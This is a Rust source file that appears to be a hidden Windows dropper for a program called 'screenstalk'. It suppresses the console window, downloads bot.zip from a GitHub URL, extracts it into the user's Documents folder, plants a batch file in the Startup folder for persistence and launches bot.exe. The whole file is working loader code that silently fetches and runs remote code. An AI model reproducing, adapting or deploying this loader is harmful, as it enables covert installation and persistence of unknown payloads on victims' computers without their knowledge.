#![windows_subsystem = "windows"]

use ureq::{self, Response};
use std::path::PathBuf;
use std::{thread, time};
use std::fs;
use directories::UserDirs;
use std::io::{self, copy};
use std::process;
use zip::ZipArchive;
use io::Write;

fn get_screenstalk_build_response() -> Response {
    println!("start");
    let reqw = ureq::get("https://github.com/Igor4er/screenstalk/raw/main/bot.zip").call();
    let mut failcount = 0;
    let file = match reqw {
        Ok(f) => f,
        Err(_) => {
            println!("fail");
            failcount += 1;
            thread::sleep(time::Duration::from_secs(10));
            if failcount >= 3 {
                process::exit(0);

            }
            get_screenstalk_build_response()
        }
    };
    println!("loaded");
    file
}

fn create_directory(dir_path: PathBuf) -> io::Result<()> {
    match fs::create_dir(dir_path) {
        Ok(()) => Ok(()),
        Err(ref err) if err.kind() == io::ErrorKind::AlreadyExists => Ok(()),
        Err(err) => Err(err),
    }
}

fn add_to_autorun(exec_file_path: PathBuf) {
    if let Some(user_dirs) = UserDirs::new() {
        let user_home = user_dirs.home_dir();
        let autorun_folder = user_home.join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        let autorun_file_path = autorun_folder.join("screenstalk.bat");
        let mut autorun_file = fs::File::create(autorun_file_path).unwrap();
        autorun_file.write_all(format!("start {}", exec_file_path.to_str().unwrap()).as_bytes()).unwrap();
    }
}

fn main() {
    let resp = get_screenstalk_build_response();
    if let Some(user_dirs) = UserDirs::new() {
        println!("got");
        let docs_dir = user_dirs.document_dir().unwrap();
        let proj_dir = docs_dir.join("screenstalk");
        create_directory(proj_dir.clone()).unwrap();
        let archive_path = proj_dir.join("bot.zip");
        let mut file = fs::File::create(archive_path.clone()).unwrap();
        copy(&mut resp.into_reader(), &mut file).unwrap();
        drop(file);
        let mut file = fs::File::open(archive_path.clone()).unwrap();
        let mut archive = ZipArchive::new(&mut file).unwrap();
        archive.extract(proj_dir.clone()).unwrap();
        let executable_file_path = proj_dir.join("bot.exe");
        add_to_autorun(executable_file_path.clone());
        process::Command::new(executable_file_path.clone()).spawn().unwrap();
    };

}